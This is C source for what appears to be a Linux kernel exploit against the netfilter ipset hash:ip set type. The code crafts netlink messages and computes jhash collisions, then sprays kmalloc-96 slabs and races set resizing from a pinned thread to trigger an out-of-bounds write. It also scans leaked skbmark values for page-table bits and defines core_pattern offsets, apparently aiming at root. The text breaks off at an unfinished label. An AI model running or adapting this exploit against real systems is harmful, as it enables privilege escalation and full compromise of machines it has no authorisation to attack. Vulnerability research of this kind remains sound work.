#include "./exploit.h"

#include <arpa/inet.h>
#include <linux/netfilter/ipset/ip_set.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netlink.h>

enum {
  NFPROTO_UNSPEC = 0,
  NFPROTO_INET = 1,
  NFPROTO_IPV4 = 2,
  NFPROTO_ARP = 3,
  NFPROTO_NETDEV = 5,
  NFPROTO_BRIDGE = 7,
  NFPROTO_IPV6 = 10,
  NFPROTO_DECNET = 12,
  NFPROTO_NUMPROTO,
};
enum ip_set_extension {
  IPSET_EXT_BIT_TIMEOUT = 0,
  IPSET_EXT_TIMEOUT = (1 << IPSET_EXT_BIT_TIMEOUT),
  IPSET_EXT_BIT_COUNTER = 1,
  IPSET_EXT_COUNTER = (1 << IPSET_EXT_BIT_COUNTER),
  IPSET_EXT_BIT_COMMENT = 2,
  IPSET_EXT_COMMENT = (1 << IPSET_EXT_BIT_COMMENT),
  IPSET_EXT_BIT_SKBINFO = 3,
  IPSET_EXT_SKBINFO = (1 << IPSET_EXT_BIT_SKBINFO),
  /* Mark set with an extension which needs to call destroy */
  IPSET_EXT_BIT_DESTROY = 7,
  IPSET_EXT_DESTROY = (1 << IPSET_EXT_BIT_DESTROY),
};
struct ipset_elem {
  struct in_addr ip;
  u32 skbmark;
  u32 skbmarkmask;
  u32 skbprio;
  u16 skbqueue;
  u16 __pad;
};
struct ip_set_skbinfo {
  u32 skbmark;
  u32 skbmarkmask;
  u32 skbprio;
  u16 skbqueue;
  u16 __pad;
};
struct ip_set_counter {
  u64 bytes;
  u64 packets;
};

int sock;
char target_name[0x20], victim_name[0x20];

#define JHASH_INITVAL 0xdeadbeef
#define HTABLE_BITS_VICTIM (11)
#define INITVAL 0xdeadbeef
#define KMALLOC_96_OBJS_PER_SLAB 42
#define TRIGGER_BUCKET_SIZE 4
#define HKEY_DATALEN 4
#define fallthrough                                                            \
  do {                                                                         \
  } while (0) /* fallthrough */
#define jhash_size(n) ((u32)1 << (n))
#define jhash_mask(n) (jhash_size(n) - 1)
#define ahash_bucket_start(h, htable_bits)                                     \
  ((htable_bits) < HTABLE_REGION_BITS ? 0                                      \
                                      : (h) * jhash_size(HTABLE_REGION_BITS))
#define ahash_bucket_end(h, htable_bits)                                       \
  ((htable_bits) < HTABLE_REGION_BITS                                          \
       ? jhash_size(htable_bits)                                               \
       : ((h) + 1) * jhash_size(HTABLE_REGION_BITS))
#define HTABLE_REGION_BITS 10
#define HKEY(data, initval, htable_bits)                                       \
  ({                                                                           \
    const u32 *__k = (const u32 *)data;                                        \
    u32 __l = HKEY_DATALEN / sizeof(u32);                                      \
    jhash2(__k, __l, initval) & jhash_mask(htable_bits);                       \
  })
#define __jhash_mix(a, b, c)                                                   \
  {                                                                            \
    a -= c;                                                                    \
    a ^= rol32(c, 4);                                                          \
    c += b;                                                                    \
    b -= a;                                                                    \
    b ^= rol32(a, 6);                                                          \
    a += c;                                                                    \
    c -= b;                                                                    \
    c ^= rol32(b, 8);                                                          \
    b += a;                                                                    \
    a -= c;                                                                    \
    a ^= rol32(c, 16);                                                         \
    c += b;                                                                    \
    b -= a;                                                                    \
    b ^= rol32(a, 19);                                                         \
    a += c;                                                                    \
    c -= b;                                                                    \
    c ^= rol32(b, 4);                                                          \
    b += a;                                                                    \
  }

/* __jhash_final - final mixing of 3 32-bit values (a,b,c) into c */
#define __jhash_final(a, b, c)                                                 \
  {                                                                            \
    c ^= b;                                                                    \
    c -= rol32(b, 14);                                                         \
    a ^= c;                                                                    \
    a -= rol32(c, 11);                                                         \
    b ^= a;                                                                    \
    b -= rol32(a, 25);                                                         \
    c ^= b;                                                                    \
    c -= rol32(b, 16);                                                         \
    a ^= c;                                                                    \
    a -= rol32(c, 4);                                                          \
    b ^= a;                                                                    \
    b -= rol32(a, 14);                                                         \
    c ^= b;                                                                    \
    c -= rol32(b, 24);                                                         \
  }
#define NLMSG_TAIL(nmsg)                                                       \
  ((struct nlattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))
#ifndef NLA_DATA
#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
#endif

#ifndef NLA_PAYLOAD
#define NLA_PAYLOAD(nla) ((int)((nla)->nla_len) - NLA_HDRLEN)
#endif

#ifndef NLA_NEXT
#define NLA_NEXT(nla, len)                                                     \
  ((len) -= NLA_ALIGN((nla)->nla_len),                                         \
   (struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
#endif

#ifndef NLA_OK
#define NLA_OK(nla, len)                                                       \
  ((len) >= (int)sizeof(struct nlattr) &&                                      \
   (nla)->nla_len >= sizeof(struct nlattr) && (nla)->nla_len <= (len))
#endif

#ifndef NLA_TYPE
#define NLA_TYPE(nla) ((nla)->nla_type & ~(NLA_F_NET_BYTEORDER | NLA_F_NESTED))
#endif

static inline __u32 rol32(__u32 word, u32 shift) {
  return (word << shift) | (word >> ((-shift) & 31));
}

static inline u32 jhash2(const u32 *k, u32 length, u32 initval) {
  u32 a, b, c;

  /* Set up the internal state */
  a = b = c = JHASH_INITVAL + (length << 2) + initval;

  /* Handle most of the key */
  while (length > 3) {
    a += k[0];
    b += k[1];
    c += k[2];
    __jhash_mix(a, b, c);
    length -= 3;
    k += 3;
  }

  /* Handle the last 3 u32's */
  switch (length) {
  case 3:
    c += k[2];
    fallthrough;
  case 2:
    b += k[1];
    fallthrough;
  case 1:
    a += k[0];
    __jhash_final(a, b, c);
    break;
  case 0: /* Nothing left to add */
    break;
  }

  return c;
}

// Helper function to send Netlink message
int send_netlink_message(struct nlmsghdr *nlh) {
  struct sockaddr_nl sa = {.nl_family = AF_NETLINK,
                           .nl_pid = 0, // For kernel
                           .nl_groups = 0};

  struct iovec iov = {.iov_base = nlh, .iov_len = nlh->nlmsg_len};

  struct msghdr msg = {.msg_name = &sa,
                       .msg_namelen = sizeof(sa),
                       .msg_iov = &iov,
                       .msg_iovlen = 1};

  return sendmsg(sock, &msg, 0);
}

int recv_netlink_message(struct nlmsghdr *nlh) {
  struct sockaddr_nl sa = {.nl_family = AF_NETLINK,
                           .nl_pid = 0, // For kernel
                           .nl_groups = 0};

  struct iovec iov = {.iov_base = nlh, .iov_len = nlh->nlmsg_len};

  struct msghdr msg = {.msg_name = &sa,
                       .msg_namelen = sizeof(sa),
                       .msg_iov = &iov,
                       .msg_iovlen = 1};

  return recvmsg(sock, &msg, 0);
}

// Add attribute to netlink message
void add_attr(struct nlmsghdr *nlh, int type, const void *data, int len) {
  struct nlattr *attr = NLMSG_TAIL(nlh);
  int size = NLA_HDRLEN + len;

  attr->nla_type = type;
  attr->nla_len = size;
  memcpy(((char *)attr) + NLA_HDRLEN, data, len);
  nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(size);
}

// Start nested attribute
struct nlattr *start_nested(struct nlmsghdr *nlh, int type) {
  struct nlattr *attr = NLMSG_TAIL(nlh);
  attr->nla_type = type | NLA_F_NESTED;
  attr->nla_len = NLA_HDRLEN;
  nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_HDRLEN;
  return attr;
}

// End nested attribute
void end_nested(struct nlmsghdr *nlh, struct nlattr *attr) {
  attr->nla_len = (char *)NLMSG_TAIL(nlh) - (char *)attr;
}

// Create an IPSet with IPv6 support
int create_ipset_ipv6(const char *set_name, u32 maxelem, u32 hash_size,
                      u32 timeout, u32 flags) {
  int ret;
  struct {
    struct nlmsghdr nlh;
    struct nfgenmsg nfg;
    char buf[0x1000];
  } d = {0};
  struct nlattr *nested;
  char buffer[0x1000];
  u8 val;
  u32 val32;

  // Initialize netlink header
  d.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
  d.nlh.nlmsg_type = IPSET_CMD_CREATE | (NFNL_SUBSYS_IPSET << 8);
  d.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
  d.nfg.nfgen_family = AF_INET6; // Changed to AF_INET6 for IPv6 support

  // Add IPSET_ATTR_PROTOCOL
  val = IPSET_PROTOCOL;
  add_attr(&d.nlh, IPSET_ATTR_PROTOCOL, &val, sizeof(val));

  // Add IPSET_ATTR_SETNAME
  add_attr(&d.nlh, IPSET_ATTR_SETNAME, set_name, strlen(set_name) + 1);

  // Add IPSET_ATTR_TYPENAME
  add_attr(&d.nlh, IPSET_ATTR_TYPENAME, "hash:ip", 8);

  // Add IPSET_ATTR_FAMILY
  val = NFPROTO_IPV6; // Changed to NFPROTO_IPV6 for IPv6 support
  add_attr(&d.nlh, IPSET_ATTR_FAMILY, &val, sizeof(val));

  // Add IPSET_ATTR_REVISION
  val = 0x3;
  add_attr(&d.nlh, IPSET_ATTR_REVISION, &val, sizeof(val));

  // Start nested attributes for IPSET_ATTR_DATA
  nested = start_nested(&d.nlh, IPSET_ATTR_DATA);

  // Add IPSET_ATTR_CADT_FLAGS
  val32 = ntohl(flags);
  add_attr(&d.nlh, IPSET_ATTR_CADT_FLAGS | NLA_F_NET_BYTEORDER, &val32,
           sizeof(val32));

  if (timeout) {
    val32 = htonl(timeout);
    add_attr(&d.nlh, IPSET_ATTR_TIMEOUT | NLA_F_NET_BYTEORDER, &val32,
             sizeof(val32));
  }

  val32 = htonl(1 << hash_size);
  add_attr(&d.nlh, IPSET_ATTR_HASHSIZE | NLA_F_NET_BYTEORDER, &val32,
           sizeof(val32));

  val32 = htonl(maxelem);
  add_attr(&d.nlh, IPSET_ATTR_MAXELEM | NLA_F_NET_BYTEORDER, &val32,
           sizeof(val32));

  // Add IPSET_ATTR_BUCKETSIZE
  val = 0xde;
  add_attr(&d.nlh, IPSET_ATTR_BUCKETSIZE, &val, sizeof(val));

  int initval = htonl(INITVAL);
  add_attr(&d.nlh, IPSET_ATTR_INITVAL, &initval, sizeof(initval));

  // End nested attributes
  end_nested(&d.nlh, nested);

  // Send the message
  ret = SYSCHK(send_netlink_message(&d.nlh));

  ret = SYSCHK(recv_netlink_message(&d.nlh));
  return 0;
}

// Create an IPSet
int create_ipset_ipv4(const char *set_name, u32 maxelem, u32 hash_size,
                      u32 timeout, u32 flags) {
  int ret;
  struct {
    struct nlmsghdr nlh;
    struct nfgenmsg nfg;
    char buf[0x1000];
  } d = {0};
  struct nlattr *nested;
  char buffer[0x1000];
  u8 val;
  u32 val32;

  // Initialize netlink header
  d.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
  d.nlh.nlmsg_type = IPSET_CMD_CREATE | (NFNL_SUBSYS_IPSET << 8);
  d.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
  d.nfg.nfgen_family = AF_INET;

  // Add IPSET_ATTR_PROTOCOL
  val = IPSET_PROTOCOL;
  add_attr(&d.nlh, IPSET_ATTR_PROTOCOL, &val, sizeof(val));

  // Add IPSET_ATTR_SETNAME
  add_attr(&d.nlh, IPSET_ATTR_SETNAME, set_name, strlen(set_name) + 1);

  // Add IPSET_ATTR_TYPENAME
  add_attr(&d.nlh, IPSET_ATTR_TYPENAME, "hash:ip", 8);

  // Add IPSET_ATTR_FAMILY
  val = NFPROTO_IPV4;
  add_attr(&d.nlh, IPSET_ATTR_FAMILY, &val, sizeof(val));

  // Add IPSET_ATTR_REVISION
  val = 0x3;
  add_attr(&d.nlh, IPSET_ATTR_REVISION, &val, sizeof(val));

  // Start nested attributes for IPSET_ATTR_DATA
  nested = start_nested(&d.nlh, IPSET_ATTR_DATA);

  // Add IPSET_ATTR_CADT_FLAGS
  val32 = ntohl(flags);
  add_attr(&d.nlh, IPSET_ATTR_CADT_FLAGS | NLA_F_NET_BYTEORDER, &val32,
           sizeof(val32));

  if (timeout) {
    val32 = htonl(timeout);
    add_attr(&d.nlh, IPSET_ATTR_TIMEOUT | NLA_F_NET_BYTEORDER, &val32,
             sizeof(val32));
  }

  val32 = htonl(1 << hash_size);
  add_attr(&d.nlh, IPSET_ATTR_HASHSIZE | NLA_F_NET_BYTEORDER, &val32,
           sizeof(val32));

  val32 = htonl(maxelem);
  add_attr(&d.nlh, IPSET_ATTR_MAXELEM | NLA_F_NET_BYTEORDER, &val32,
           sizeof(val32));
  // Add IPSET_ATTR_BUCKETSIZE
  val = 0xde;
  add_attr(&d.nlh, IPSET_ATTR_BUCKETSIZE, &val, sizeof(val));

  int initval = htonl(INITVAL);
  add_attr(&d.nlh, IPSET_ATTR_INITVAL, &initval, sizeof(initval));

  // End nested attributes
  end_nested(&d.nlh, nested);

  // Send the message
  ret = SYSCHK(send_netlink_message(&d.nlh));

  ret = SYSCHK(recv_netlink_message(&d.nlh));
  return 0;
}

// Add IP address to IPSet
int add_to_ipset(const char *set_name, const struct in_addr *in_addr,
                 u32 timeout, struct ip_set_counter *counter,
                 struct ip_set_skbinfo *skbinfo) {
  static u32 cnt = 0;
  int ret;
  struct {
    struct nlmsghdr nlh;
    struct nfgenmsg nfg;
    char buf[0x1000];
  } d = {0};
  struct nlattr *nested, *nested_ip;
  u8 val8;
  u16 val16;
  u32 val32;
  u64 val64;
  struct in_addr addr;

  addr = *in_addr;

  // Initialize netlink header
  d.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
  d.nlh.nlmsg_type = IPSET_CMD_ADD | (NFNL_SUBSYS_IPSET << 8);
  d.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
  d.nfg.nfgen_family = AF_INET;

  // Add IPSET_ATTR_PROTOCOL
  val8 = IPSET_PROTOCOL;
  add_attr(&d.nlh, IPSET_ATTR_PROTOCOL, &val8, sizeof(val8));

  // Add IPSET_ATTR_SETNAME
  add_attr(&d.nlh, IPSET_ATTR_SETNAME, set_name, strlen(set_name) + 1);

  // Start nested attributes for IPSET_ATTR_DATA
  nested = start_nested(&d.nlh, IPSET_ATTR_DATA);

  // Add counter extension attributes if counter is provided
  if (counter) {
    counter->bytes = htobe64(counter->bytes);
    add_attr(&d.nlh, IPSET_ATTR_BYTES | NLA_F_NET_BYTEORDER, &counter->bytes,
             sizeof(counter->bytes));
    counter->packets = htobe64(counter->packets);
    add_attr(&d.nlh, IPSET_ATTR_PACKETS | NLA_F_NET_BYTEORDER,
             &counter->packets, sizeof(counter->packets));
  }

  if (skbinfo) {
    val64 = htonl(skbinfo->skbmark);
    val64 = val64 << 32 | htonl(skbinfo->skbmarkmask);
    add_attr(&d.nlh, IPSET_ATTR_SKBMARK | NLA_F_NET_BYTEORDER, &val64,
             sizeof(val64));
    val32 = htonl(skbinfo->skbprio);
    add_attr(&d.nlh, IPSET_ATTR_SKBPRIO | NLA_F_NET_BYTEORDER, &val32,
             sizeof(val32));
    val16 = htons(skbinfo->skbqueue);
    add_attr(&d.nlh, IPSET_ATTR_SKBQUEUE | NLA_F_NET_BYTEORDER, &val16,
             sizeof(val16));
  }

  if (timeout) {
    val32 = htonl(timeout);
    add_attr(&d.nlh, IPSET_ATTR_TIMEOUT | NLA_F_NET_BYTEORDER, &val32,
             sizeof(val32));
  }

  nested_ip = start_nested(&d.nlh, IPSET_ATTR_IP);
  // Add IPSET_ATTR_IP
  add_attr(&d.nlh, IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER, &addr.s_addr,
           sizeof(addr.s_addr));

  end_nested(&d.nlh, nested_ip);

  // End nested attributes
  end_nested(&d.nlh, nested);

  // Send the message
  ret = SYSCHK(send_netlink_message(&d.nlh));

  ret = SYSCHK(recv_netlink_message(&d.nlh));
  return 0;
}

int delete_from_ipset(const char *set_name, const struct in_addr *in_addr) {
  int ret;
  struct {
    struct nlmsghdr nlh;
    struct nfgenmsg nfg;
    char buf[0x1000];
  } d = {0};
  struct nlattr *nested, *nested_ip, *nested_adt, *nested_element;
  u8 val8;
  struct in_addr addr;
  addr = *in_addr;

  // Initialize netlink header
  d.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
  d.nlh.nlmsg_type = IPSET_CMD_DEL | (NFNL_SUBSYS_IPSET << 8);
  d.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
  d.nfg.nfgen_family = AF_INET; // Changed back to AF_INET

  // Add IPSET_ATTR_PROTOCOL
  val8 = IPSET_PROTOCOL;
  add_attr(&d.nlh, IPSET_ATTR_PROTOCOL, &val8, sizeof(val8));

  // Add IPSET_ATTR_SETNAME
  add_attr(&d.nlh, IPSET_ATTR_SETNAME, set_name, strlen(set_name) + 1);

  // Start nested attributes for IPSET_ATTR_DATA
  nested = start_nested(&d.nlh, IPSET_ATTR_DATA);

  nested_ip = start_nested(&d.nlh, IPSET_ATTR_IP);
  add_attr(&d.nlh, IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER, &addr.s_addr,
           sizeof(addr.s_addr));
  end_nested(&d.nlh, nested_ip);

  // End nested attributes
  end_nested(&d.nlh, nested);
  // Send the message
  ret = SYSCHK(send_netlink_message(&d.nlh));

  return 0;
}

struct ipset_elem **list_ipset(const char *set_name, bool str) {
  struct {
    struct nlmsghdr nlh;
    struct nfgenmsg nfg;
    char buf[0x1000];
  } req = {0};
  u8 val;

  // Initialize netlink header for request
  req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
  req.nlh.nlmsg_type = IPSET_CMD_LIST | (NFNL_SUBSYS_IPSET << 8);
  req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP; // Use DUMP flag for listing
  req.nfg.nfgen_family = AF_INET;

  // Add IPSET_ATTR_PROTOCOL
  val = IPSET_PROTOCOL;
  add_attr(&req.nlh, IPSET_ATTR_PROTOCOL, &val, sizeof(val));

  // Add IPSET_ATTR_SETNAME
  add_attr(&req.nlh, IPSET_ATTR_SETNAME, set_name, strlen(set_name) + 1);

  int rcvbuf_size = 4 * 1024 * 1024; // 4MB buffer
  SYSCHK(setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf_size,
                    sizeof(rcvbuf_size)));

  // Send the message
  SYSCHK(send_netlink_message(&req.nlh));

  // Process the response in smaller chunks to avoid buffer overflow
  char buffer[8192];
  struct sockaddr_nl sa;
  bool done = false;
  u64 sz = 0x100, idx = 1, count = 0;
  struct ipset_elem **res = malloc(sz);

  while (!done) {
    memset(buffer, 0, sizeof(buffer));
    struct in_addr *addr;
    struct iovec iov = {.iov_base = buffer, .iov_len = sizeof(buffer)};
    struct msghdr msg = {.msg_name = &sa,
                         .msg_namelen = sizeof(sa),
                         .msg_iov = &iov,
                         .msg_iovlen = 1};

    // Receive data in chunks with simplified error handling
    ssize_t len = SYSCHK(recvmsg(sock, &msg, 0));

    // Process the messages in this chunk
    struct nlmsghdr *nlh = (struct nlmsghdr *)buffer;

    while (NLMSG_OK(nlh, len)) {
      // Check message type
      if (nlh->nlmsg_type == NLMSG_DONE) {
        done = true;
        break;
      } else if (nlh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *err = NLMSG_DATA(nlh);
        if (err->error != 0) {
          LOG("Error: %s", strerror(-err->error));
          done = true;
          break;
        }
      } else if ((nlh->nlmsg_type & 0xFF00) >> 8 == NFNL_SUBSYS_IPSET) {
        struct nfgenmsg *nfg = NLMSG_DATA(nlh);
        struct nlattr *attrs[IPSET_ATTR_ADT_MAX + 1] = {0};

        // Parse attributes at top level
        int remaining = nlh->nlmsg_len - NLMSG_LENGTH(sizeof(*nfg));
        struct nlattr *attr = (struct nlattr *)((char *)nfg + sizeof(*nfg));

        // Process all attributes at top level
        while (NLA_OK(attr, remaining)) {
          if (NLA_TYPE(attr) <= IPSET_ATTR_ADT_MAX) {
            attrs[NLA_TYPE(attr)] = attr;
          }
          attr = NLA_NEXT(attr, remaining);
        }

        // Look for ADT attribute (contains entries)
        if (attrs[IPSET_ATTR_ADT]) {
          struct nlattr *adt_attr = attrs[IPSET_ATTR_ADT];
          int adt_remaining = NLA_PAYLOAD(adt_attr);
          struct nlattr *adt_elem = NLA_DATA(adt_attr);
#ifdef DEBUG
          LOG("===");
          LOG("type: %d", NLA_TYPE(adt_elem));
          hexdump(NLA_DATA(adt_elem), adt_elem->nla_len - NLA_HDRLEN);
#endif

          // Process each ADT element (each represents an entry)
          while (NLA_OK(adt_elem, adt_remaining)) {
            // Direct parsing of the element's attributes
            int elem_remaining = NLA_PAYLOAD(adt_elem);
            struct nlattr *elem_attr = NLA_DATA(adt_elem);

            // Temporary variables for entry data
            char ip_str[INET_ADDRSTRLEN] = "unknown";
            uint64_t skb_mark = 0;
            uint32_t skb_prio = 0, skbmark = 0, skbmarkmask = 0;
            uint16_t skb_queue = 0;
            bool ip_found = false, bytes_found = false, packets_found = false,
                 timeout_found = false;

            // Parse all attributes at element level
            while (NLA_OK(elem_attr, elem_remaining)) {
#ifdef DEBUG
              LOG("***");
              LOG("type: %d", NLA_TYPE(elem_attr));
              hexdump(NLA_DATA(elem_attr), elem_attr->nla_len - NLA_HDRLEN);
#endif
              // Check for specific attribute types
              if (NLA_TYPE(elem_attr) == IPSET_ATTR_IP) {
                // Parse IP attribute which is nested
                struct nlattr *ip_attr = elem_attr;
                int ip_remaining = NLA_PAYLOAD(ip_attr);
                struct nlattr *ip_elem = NLA_DATA(ip_attr);

                // Look for IPv4 address inside the IP attribute
                while (NLA_OK(ip_elem, ip_remaining)) {
                  if (NLA_TYPE(ip_elem) == IPSET_ATTR_IPADDR_IPV4) {
                    addr = NLA_DATA(ip_elem);
                    if (inet_ntop(AF_INET, addr, ip_str, sizeof(ip_str))) {
                      ip_found = true;
                    }
                    count++;
                  }
                  ip_elem = NLA_NEXT(ip_elem, ip_remaining);
                }
              } else if (NLA_TYPE(elem_attr) == IPSET_ATTR_SKBMARK) {
                uint64_t *skb_mark_ptr = NLA_DATA(elem_attr);
                skb_mark = be64toh(*skb_mark_ptr);
                skbmark = skb_mark >> 32;
                skbmarkmask = skb_mark & ((1ull << 32) - 1);
                if (skbmark > 10 || skbmarkmask > 10) {
                  LOG("Big skbmark at %lx: %lx", idx, skb_mark);
                }
              } else if (NLA_TYPE(elem_attr) == IPSET_ATTR_SKBPRIO) {
                uint32_t *skb_prio_ptr = NLA_DATA(elem_attr);
                skb_prio = be32toh(*skb_prio_ptr);
              } else if (NLA_TYPE(elem_attr) == IPSET_ATTR_SKBQUEUE) {
                uint16_t *skb_queue_ptr = NLA_DATA(elem_attr);
                skb_queue = be16toh(*skb_queue_ptr);
              }
              elem_attr = NLA_NEXT(elem_attr, elem_remaining);
            }

            // Ensure we have enough space in result array
            if (idx * 8 >= sz) {
              res = realloc(res, sz * 2);
              sz *= 2;
            }

            // Create new ipset element and store it
            struct ipset_elem *ptr = calloc(1, sizeof(struct ipset_elem));
            *ptr = (struct ipset_elem){.ip = *addr,
                                       .skbmark = skbmark,
                                       .skbmarkmask = skbmarkmask,
                                       .skbprio = skb_prio,
                                       .skbqueue = skb_queue};
            res[idx++] = ptr;

            adt_elem = NLA_NEXT(adt_elem, adt_remaining);
          }
        }
      } else {
        LOG("Unknown message type: 0x%x", nlh->nlmsg_type);
      }

      nlh = NLMSG_NEXT(nlh, len);
    }
  }

  // Store count at the beginning of result array
  ((long *)res)[0] = count;

  return res;
}
// Function to increment an IPv4 address
void increment_ipv4(struct in_addr *addr) {
  addr->s_addr = htonl(ntohl(addr->s_addr) + 1);
}

void find_collision4(struct in_addr *addr, u32 prev_hash, u32 htable_bits) {
  u32 hash;
  while (1) {
    increment_ipv4(addr);
    hash = HKEY(&addr->s_addr, INITVAL, htable_bits);
    if (prev_hash == hash) {
      return;
    }
  }
}

void wait_ms(u64 msec) {
  u64 delta_ms = 0;
  struct timespec start, end;
  clock_gettime(CLOCK_MONOTONIC_RAW, &start);
  while (delta_ms < msec) {
    clock_gettime(CLOCK_MONOTONIC_RAW, &end);
    delta_ms = (end.tv_sec - start.tv_sec) * 1000 +
               (end.tv_nsec - start.tv_nsec) / 1000000;
  }
}

#define LOOP_COUNT 8
#define REGION_N (1 << 3)
#define HTABLE_BITS (10 + 3)
#define PTRS_N 0x80
#define HASH_N (0x400)
#define ADDR_N (1 << (HTABLE_BITS))
#define PHYSICAL_ALIGN 0x1000000ull
#define CORE_PATTERN_PAGE_OFFSET 0xea0ull
#define CORE_PATTERN_PHYS_OFFSET 0x9bb000ull

struct in_addr addrs4[ADDR_N][4];
struct in_addr victim_addrs[KMALLOC_96_OBJS_PER_SLAB * 24];
struct in_addr coll_addrs[0x100];
enum th_status_t { TH_WAIT = 0, TH_RACE, TH_END };
enum th_status_t th_status = TH_WAIT;
const int main_cpu = 0, add_cpu = 1;
long *ptrs[PTRS_N];
int ptrs_idx = 1;

void fill_kmalloc_96(u32 n) {
  static u32 i;
  struct ip_set_counter counter;
  char name[0x20];
  snprintf(name, 0x20, "padding_%d", i++);
  create_ipset_ipv4(name, 0xffffff, HTABLE_BITS, 0xffffffff,
                    IPSET_FLAG_WITH_COUNTERS);
  rep(i, n) { add_to_ipset(name, &addrs4[i][0], 0, &counter, NULL); }
}

void *race_add(void *arg) {
  const u32 timeout = 1;
  static struct timespec __thread now, before;
  struct ip_set_skbinfo skbinfo;

  thread_assign_to_core(add_cpu);
  if (before.tv_sec == 0 && before.tv_nsec == 0) {
    clock_gettime(CLOCK_MONOTONIC_RAW, &before);
  }

  while (1) {
    switch (th_status) {
    case TH_WAIT:
      while (th_status == TH_WAIT)
        ;
      break;
    case TH_END:
      LOG("race_add: end");
      sleep(99999999);
      return NULL;
    case TH_RACE:
      clock_gettime(CLOCK_MONOTONIC_RAW, &now);
      LOG("time diff: %ld", (now.tv_sec - before.tv_sec) * 1000 +
                                (now.tv_nsec - before.tv_nsec) / 1000000);
      before = now;

      // add AHASH_INIT_SIZE elements to trigger shrink
      for (u64 hash = 0; hash < HASH_N; hash++) {
        if (!(hash % REGION_N))
          continue;
        // header_size + 0x80 * (dsize == 0x20) is enough
        skbinfo = (struct ip_set_skbinfo){.skbmark = 0xffffffffu,
                                          .skbmarkmask = 0xffffffffu,
                                          .skbprio = 0xffff80ffu,
                                          .skbqueue = 0xffff};
        add_to_ipset(target_name, &addrs4[hash][2], timeout, NULL, &skbinfo);
      }
      for (u64 hash = 0; hash < HASH_N; hash++) {
        if (!(hash % REGION_N))
          continue;
        skbinfo = (struct ip_set_skbinfo){.skbmark = 0xffffffffu,
                                          .skbmarkmask = 0xffffffffu,
                                          .skbprio = 0xffff80ffu,
                                          .skbqueue = 0xffff};
        add_to_ipset(target_name, &addrs4[hash][3], timeout, NULL, &skbinfo);
      }

      if (th_status == TH_END)
        break;
      th_status = TH_WAIT;
      break;
    }
  }
}

u64 find_vuln_victim_idx(char *victim_name) {
  const u64 pte_bits = 0x67;
  struct ipset_elem **elems, *elem;
  u64 prev_hash, hash, n, vuln_hash = 0;
  elems = list_ipset(victim_name, false);
  n = *(long *)elems;
  LOG("%lx elems", n);
  if (!n)
    return -1;
  prev_hash = HKEY(&elems[1]->ip, INITVAL, HTABLE_BITS);
  for (int i = 2; i < n; i++) {
    hash = HKEY(&elems[i]->ip, INITVAL, HTABLE_BITS_VICTIM);
    if (hash && hash - 2 != prev_hash) {
      vuln_hash = prev_hash;
      LOG("vuln_hash: %lx", vuln_hash);
      for (int j = i; j < n; j++) {
        u64 skb_mark = ((u64)elems[j]->skbmarkmask << 32) | elems[j]->skbmark;
        if ((skb_mark & 0xff) == pte_bits)
          return vuln_hash;
      }
      return -1;
    }
    prev_hash = hash;
  }

  return -1;
}

__attribute__((always_inline)) void inline add_1sec_N_ms(struct timespec *time,
                                                         u64 N) {
  time->tv_sec += 1;
  time->tv_nsec += N * 1000 * 1000;
  if (time->tv_nsec >= 1000 * 1000 * 1000) {
    time->tv_sec++;
    time->tv_nsec -= 1000 * 1000 * 1000;
  }
}

int trigger_oob() {
  const u32 timeout = 0xffffff, N = KMALLOC_96_OBJS_PER_SLAB * 2;
  u64 coll_hash;
  pthread_t th;
  struct timespec created_at, now;
  struct timespec start_time, target_time;
  struct ip_set_skbinfo skbinfo = {0};
  static int sz_off = -1;

  thread_assign_to_core(main_cpu);
  LOG("target: %s", target_name);
  LOG("victim: %s", victim_name);
  sz_off++;

  create_ipset_ipv4(target_name, 0xffffff, HTABLE_BITS, 1,
                    IPSET_FLAG_WITH_SKBINFO);
  clock_gettime(CLOCK_MONOTONIC_RAW, &created_at);

  for (u64 hash = 0; hash < HASH_N; hash++) {
    // no race condition in case of hash % REGION_N == 0
    if (!(hash % REGION_N))
      continue;
    rep(i, TRIGGER_BUCKET_SIZE) {
      add_to_ipset(target_name, &addrs4[hash][i], timeout, 0, &skbinfo);
    }
  }

  th_status = TH_WAIT;
  pthread_create(&th, NULL, race_add, NULL);

  clock_gettime(CLOCK_MONOTONIC, &start_time);
  target_time = start_time;
  // LOOP_CNT * 4 < PTRS_N
  rep(loop_cnt, 4) {
    // Step 1
    fill_kmalloc_96(HASH_N * 2);
    rep(i, N) {
      add_to_ipset(victim_name, &victim_addrs[i + loop_cnt * N], 0, NULL,
                   &skbinfo);
    }
    rep(i, N) {
      if (i % 2)
        delete_from_ipset(victim_name, &victim_addrs[i + loop_cnt * N]);
    }
    *ptrs[ptrs_idx++] = 0;

    // Step 2
    add_1sec_N_ms(&target_time, 40);
    th_status = TH_RACE;

    // Step 3
    while (th_status == TH_RACE)
      ;
    clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &target_time, NULL);

    // Step 4
    th_status = TH_RACE;

    add_1sec_N_ms(&target_time, 50);

    while (th_status == TH_RACE)
      ;
    if ((coll_hash = find_vuln_victim_idx(victim_name)) != -1) {
      goto find_vuln;
    }

    // Step 5
    clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &target_time, NULL);
  }

  th_status = TH_END;
  wait_ms(300);

  LOG("trigger_oob end");
  return 1;

find_vuln:
